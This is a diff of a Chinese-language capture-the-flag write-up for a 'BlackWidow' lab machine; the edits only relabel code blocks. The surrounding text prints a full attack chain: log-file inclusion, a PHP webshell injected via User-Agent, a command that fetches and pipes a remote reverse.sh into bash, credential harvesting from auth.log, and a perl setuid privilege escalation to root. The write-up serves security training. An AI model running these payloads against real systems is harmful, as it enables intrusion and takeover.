@@ -165,7 +165,7 @@ statd:x:108:65534::/var/lib/nfs:/usr/sbin/nologin
 
 ### 本地包含日志文件实现 webshell 部署
 
-```shell
+```bash
 ┌─[randark@parrot]─[~]
 └──╼ $ http get http://192.168.56.121/company/started.php?file=../../../../../../../../../../../../../var/log/apache2/access.log
 HTTP/1.1 200 OK
@@ -185,13 +185,13 @@ Vary: Accept-Encoding
 
 尝试一下，可以通过 `user-agent` 将特定字符串写入日志文件，从而部署一个 webshell 进去
 
-```shell
+```bash
 curl http://192.168.56.121/ --user-agent "<?php system($_GET['shell']); ?>"
 ```
 
 然后
 
-```shell
+```bash
 http get "http://192.168.56.121/company/started.php?file=../../../../../../../../../../../../../var/log/apache2/access.log&shell=cat+/etc/passwd"
 ```
 
@@ -199,14 +199,14 @@ http get "http://192.168.56.121/company/started.php?file=../../../../../../../..
 
 尝试借助恶意脚本投送服务器实现反向 shell
 
-```shell
+```bash
 ┌─[randark@parrot]─[~]
 └──╼ $ http get "http://192.168.56.121/company/started.php?file=../../../../../../../../../../../../../var/log/apache2/access.log&shell=curl+192.168.56.102/reverse.sh+|+bash"
 ```
 
 ## User - www-data
 
-```shell
+```bash
 ┌─[randark@parrot]─[~]
 └──╼ $ pwncat-cs -lp 9999
 [00:26:56] Welcome to pwncat 🐈!
@@ -219,7 +219,7 @@ www-data
 
 ### 读取 SSH 认证日志
 
-```shell
+```bash
 (remote) www-data@blackwidow:/var/backups$ cat auth.log | grep sshd
 ......
 Dec 12 16:56:43 test sshd[29560]: Invalid user ?V1p3r2020!? from 192.168.1.109 port 7090
@@ -248,7 +248,7 @@ viper
 
 ### flag - user
 
-```shell
+```bash
 (remote) viper@blackwidow:/home/viper$ cat local.txt
 d930fe79919376e6d08972dae222526b
 ```
@@ -269,7 +269,7 @@ d930fe79919376e6d08972dae222526b
 
 查看 `/home/viper/backup_site/assets/vendor/weapon/arsenic` 文件的形式
 
-```shell
+```bash
 (remote) viper@blackwidow:/home/viper$ file /home/viper/backup_site/assets/vendor/weapon/arsenic
 /home/viper/backup_site/assets/vendor/weapon/arsenic: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=36da142560b2aa57fcade932db83015f6f612052, stripped
 (remote) viper@blackwidow:/home/viper$ /home/viper/backup_site/assets/vendor/weapon/arsenic --version
@@ -291,7 +291,7 @@ Internet, point your browser at http://www.perl.org/, the Perl Home Page.
 
 ## User - root
 
-```shell
+```bash
 (remote) viper@blackwidow:/home/viper$ /home/viper/backup_site/assets/vendor/weapon/arsenic -e 'use POSIX qw(setuid); POSIX::setuid(0); exec"/bin/bash";'
 root@blackwidow:~# whoami
 root
@@ -299,7 +299,7 @@ root
 
 ### flag - root
 
-```shell
+```bash
 root@blackwidow:/root# cat root.txt
 
 
